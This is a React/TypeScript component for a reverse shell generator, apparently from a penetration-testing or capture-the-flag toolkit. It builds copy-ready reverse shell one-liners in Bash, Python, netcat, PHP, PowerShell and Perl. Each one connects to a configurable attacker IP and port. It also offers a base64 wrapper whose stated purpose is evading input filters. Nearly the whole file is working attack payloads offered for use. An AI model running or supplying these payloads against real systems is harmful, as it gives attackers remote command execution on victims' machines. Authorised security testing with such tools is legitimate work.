"use client"

import { useState } from "react"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Button } from "@/components/ui/button"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { Select, SelectContent, SelectGroup, SelectItem, SelectLabel, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Copy, Terminal, Monitor, Globe } from "lucide-react"

export function ReverseShellGenerator() {
    const [ip, setIp] = useState("10.10.14.2")
    const [port, setPort] = useState("9001")
    const [shellType, setShellType] = useState("/bin/bash")
    const [filterBase64, setFilterBase64] = useState(false)

    const shells = {
        bash: [
            { name: "Bash -i", code: `bash -i >& /dev/tcp/${ip}/${port} 0>&1` },
            { name: "Bash 196", code: `0<&196;exec 196<>/dev/tcp/${ip}/${port}; sh <&196 >&196 2>&196` },
            { name: "Bash 5", code: `bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1'` },
            { name: "Bash UDP", code: `sh -i >& /dev/udp/${ip}/${port} 0>&1` },
        ],
        python: [
            { name: "Python3 Short", code: `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("${ip}",${port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("${shellType}")'` },
            { name: "Python Import", code: `export RHOST="${ip}";export RPORT=${port};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("${shellType}")'` },
        ],
        netcat: [
            { name: "Netcat Traditional", code: `nc -e ${shellType} ${ip} ${port}` },
            { name: "Netcat OpenBSD", code: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shellType} -i 2>&1|nc ${ip} ${port} >/tmp/f` },
            { name: "Ncat", code: `ncat ${ip} ${port} -e ${shellType}` },
        ],
        php: [
            { name: "PHP Exec", code: `php -r '$sock=fsockopen("${ip}",${port});exec("${shellType} <&3 >&3 2>&3");'` },
            { name: "PHP Shell_Exec", code: `php -r '$sock=fsockopen("${ip}",${port});shell_exec("${shellType} <&3 >&3 2>&3");'` },
            { name: "PHP System", code: `php -r '$sock=fsockopen("${ip}",${port});system("${shellType} <&3 >&3 2>&3");'` },
        ],
        powershell: [
            { name: "PowerShell #1", code: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()` }
        ],
        perl: [
            { name: "Perl", code: `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("${shellType} -i");};'` }
        ]
    }

    const copyToClipboard = (text: string) => {
        navigator.clipboard.writeText(text)
    }

    const processPayload = (code: string) => {
        if (filterBase64) {
            return `echo ${btoa(code)} | base64 -d | bash`
        }
        return code
    }

    return (
        <div className="grid gap-6 lg:grid-cols-3">
            <Card className="lg:col-span-1 border-primary/20 bg-primary/5">
                <CardHeader>
                    <CardTitle className="text-lg">Configuration</CardTitle>
                    <CardDescription>Target listener details</CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                    <div className="space-y-2">
                        <Label>IP Address</Label>
                        <Input
                            value={ip}
                            onChange={(e) => setIp(e.target.value)}
                            placeholder="10.10.X.X"
                            className="font-mono text-primary bg-background"
                        />
                    </div>

                    <div className="space-y-2">
                        <Label>Port</Label>
                        <Input
                            value={port}
                            onChange={(e) => setPort(e.target.value)}
                            placeholder="9001"
                            className="font-mono bg-background"
                        />
                    </div>

                    <div className="space-y-2">
                        <Label>Shell</Label>
                        <Select value={shellType} onValueChange={setShellType}>
                            <SelectTrigger>
                                <SelectValue />
                            </SelectTrigger>
                            <SelectContent>
                                <SelectItem value="/bin/bash">/bin/bash</SelectItem>
                                <SelectItem value="/bin/sh">/bin/sh</SelectItem>
                                <SelectItem value="/bin/zsh">/bin/zsh</SelectItem>
                                <SelectItem value="cmd.exe">cmd.exe</SelectItem>
                                <SelectItem value="powershell.exe">powershell.exe</SelectItem>
                            </SelectContent>
                        </Select>
                    </div>

                    <div className="pt-4 border-t">
                        <Button
                            variant={filterBase64 ? "default" : "outline"}
                            className="w-full justify-start"
                            onClick={() => setFilterBase64(!filterBase64)}
                        >
                            <div className={`mr-2 h-4 w-4 border rounded ${filterBase64 ? "bg-white" : ""}`} />
                            Base64 Encode Payload
                        </Button>
                        <p className="text-xs text-muted-foreground mt-2">
                            Wraps payload in `echo b64... | base64 -d | bash` to bypass BadChar filters.
                        </p>
                    </div>
                </CardContent>
            </Card>

            <div className="lg:col-span-2">
                <Tabs defaultValue="bash" className="h-full">
                    <TabsList className="w-full justify-start overflow-x-auto">
                        <TabsTrigger value="bash" className="flex gap-2"><Terminal className="h-4 w-4" /> Bash</TabsTrigger>
                        <TabsTrigger value="python" className="flex gap-2"><Monitor className="h-4 w-4" /> Python</TabsTrigger>
                        <TabsTrigger value="netcat" className="flex gap-2"><Globe className="h-4 w-4" /> Netcat</TabsTrigger>
                        <TabsTrigger value="php">PHP</TabsTrigger>
                        <TabsTrigger value="powershell">PowerShell</TabsTrigger>
                        <TabsTrigger value="perl">Perl</TabsTrigger>
                    </TabsList>

                    {Object.entries(shells).map(([key, list]) => (
                        <TabsContent key={key} value={key} className="space-y-4 mt-4">
                            {list.map((shell, i) => (
                                <Card key={i} className="group">
                                    <div className="p-4 flex flex-col gap-2">
                                        <div className="flex items-center justify-between">
                                            <span className="text-sm font-medium text-muted-foreground">{shell.name}</span>
                                            <Button
                                                variant="ghost"
                                                size="sm"
                                                className="h-8 opacity-50 group-hover:opacity-100 transition-opacity"
                                                onClick={() => copyToClipboard(processPayload(shell.code))}
                                            >
                                                <Copy className="h-3 w-3 mr-1" /> Copy
                                            </Button>
                                        </div>
                                        <code className="text-xs bg-black/40 p-3 rounded font-mono text-green-400 break-all border border-white/5">
                                            {processPayload(shell.code)}
                                        </code>
                                    </div>
                                </Card>
                            ))}
                        </TabsContent>
                    ))}
                </Tabs>
            </div>
        </div>
    )
}
